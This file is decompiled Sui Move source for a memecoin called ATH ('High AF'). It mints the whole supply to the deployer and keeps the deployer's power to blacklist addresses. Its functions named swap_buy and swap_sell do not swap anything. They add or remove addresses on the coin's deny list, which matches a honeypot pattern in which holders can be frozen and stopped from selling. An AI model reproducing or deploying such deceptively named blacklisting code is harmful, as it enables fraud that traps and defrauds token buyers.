module 0xc3cd0b73d2bdde3e19e457b8fadfa26fa0b9a5799690f9e6022abbf827e2f3cf::ath {
    struct ATH has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: ATH, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<ATH>(arg0, 9, b"ATH", b"High AF", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmeUjRLcsjvHdfqhMtf76NKZF3tbygwtQ99jbWmRdMGfUD"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<ATH>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<ATH>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<ATH>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<ATH>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<ATH>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<ATH>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<ATH>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<ATH>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

